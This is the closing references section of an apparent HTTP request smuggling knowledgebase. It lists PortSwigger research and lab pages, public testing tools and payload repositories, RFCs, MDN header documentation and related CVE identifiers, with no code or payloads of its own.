   - https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface

8. **Bypassing CSP with Policy Injection** — PortSwigger Research.
   - https://portswigger.net/research/bypassing-csp-with-policy-injection

9. **DOM Clobbering Strikes Back** — PortSwigger Research.
   - https://portswigger.net/research/dom-clobbering-strikes-back

10. **Hidden OAuth Attack Vectors** — PortSwigger Research.
    - https://portswigger.net/research/hidden-oauth-attack-vectors

### PortSwigger Web Security Academy

- https://portswigger.net/web-security/request-smuggling
- https://portswigger.net/web-security/request-smuggling/browser
- https://portswigger.net/web-security/request-smuggling/exploiting
- https://portswigger.net/web-security/request-smuggling/advanced
- Labs: basic CL.TE, basic TE.CL, obfuscating TE header, HTTP/2 smuggling, browser-powered desync, CL.0

### Tools & Repositories

- **HTTP Request Smuggler**: github.com/PortSwigger/http-request-smuggler
- **Param Miner**: github.com/PortSwigger/param-miner
- **Smuggler (defparam)**: github.com/defparam/smuggler
- **http2smugl**: github.com/neex/http2smugl
- **h2csmuggler (BishopFox)**: github.com/BishopFox/h2csmuggler
- **PayloadsAllTheThings / Request Smuggling**: github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
- **Nuclei Templates / Request Smuggling**: github.com/projectdiscovery/nuclei-templates/tree/main/http/misconfiguration/request-smuggling
- **http-request-smuggling-payload-list**: github.com/payloadbox/http-request-smuggling-payload-list

### Additional References

- **HackTricks / HTTP Request Smuggling**: book.hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html
- **A Pentester's Guide to HTTP Request Smuggling** — Busra Demir, 2020.
- **Advanced Request Smuggling** — PortSwigger, 2021.
- **Practical Attacks Using HTTP Request Smuggling** — @defparam.
- **RFC 2616** — HTTP/1.1 Specification (Content-Length vs Transfer-Encoding).
- **RFC 7540** — HTTP/2 Specification.
- **RFC 9113** — HTTP/2 (updated).
- **Mozilla Developer Network / HTTP Headers**:
  - developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding
  - developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Length
  - developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Connection

### CVEs Mentioned

- **CVE-2021-21295**: Netty HTTP/2 downgrading (Netflix).
- **CVE-2021-33193**: Apache mod_proxy request line injection.
- **CVE-2022-20713**: Cisco ASA WebVPN client-side desync.
- **K50375550**: F5 BIG-IP TE.TE vulnerability.
- **K97045220**: F5 BIG-IP H2.X request splitting.

---

> **End of Knowledgebase**  
> This document consolidates research from PortSwigger, HackTricks, PayloadsAllTheThings, Nuclei, and real-world bug bounty case studies. Use responsibly for authorized security testing only.
